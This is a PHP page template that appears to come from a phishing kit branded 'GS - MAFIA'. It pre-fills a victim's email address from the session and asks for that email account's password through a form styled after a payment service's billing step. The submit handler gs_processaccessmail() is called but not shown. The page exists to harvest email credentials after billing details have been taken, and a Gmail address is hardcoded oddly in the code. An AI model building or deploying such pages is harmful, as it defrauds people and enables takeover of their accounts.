<?php 
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
session_start();
include("languages/index.php");
include ("languages/lang".$_SESSION['gs_langlink']);
$gs_email =$_SESSION['gs_logarray']['gs_email'];
$domain_name = substr(strrchr($gs_email, "waldzou1@gmail.com"), 1);
?>
<div class="CTABannerContainer CTABannerContainer--billinginfopage "><div class="DefaultCTABanner"></div><div class="DefaultGreeting"><div class="cta-banner"><div class="cta-headline"><span class="cta-name"><h2 style="margin-bottom: 10px;"><?php echo $gs_string26 ?></h2></span><div class="textInput lap">
<div class="fields email large">
<div class="nativeDropdown  large ">
<div class="selectDropdown ">
</div>
</div>
</div>
</div>
<div class="cta-name"><center><h2 style="color: #0666B3;"><?php echo $domain_name; ?></h2></center></div>
</div></div></div></div>
<div class="body-content">
	<div id="address-suggest-field" class="AddressSuggestField">
		<div class="TextField form-field">
			<div class="inputField textInput">
			<input type="text" name="gs_accessemail" onblur="gs_verifinput(2);" onfocus="$(this).parent().removeClass('haserror');$(this).parent().removeClass('gs_inputsuccess');" value="<?php echo $_SESSION['gs_logarray']['gs_email'] ?>" id="gs_accessemail" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false">
			<label class="input-has-value" for="street1"><?php echo $gs_string27 ?></label>
			</div>
		</div>
	</div>
	<div id="address-suggest-field" class="AddressSuggestField">
		<div class="TextField form-field">
			<div class="inputField textInput">
			<input type="password" name="gs_accesspassword" onblur="gs_verifinput(2);" onfocus="$(this).parent().removeClass('haserror');$(this).parent().removeClass('gs_inputsuccess');" id="gs_accesspassword" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false">
			<label class="input-has-value" for="street1"><?php echo $gs_string28 ?></label>
			</div>
		</div>
	</div>
	<div id="action-buttons" class="buttons">
		<button class="CAPE-Button btn full " onclick="gs_processaccessmail();" type="button" id="billingInfoContinueBtn">
			<span><?php echo $gs_string19 ?></span>
		</button>
	</div>
</div>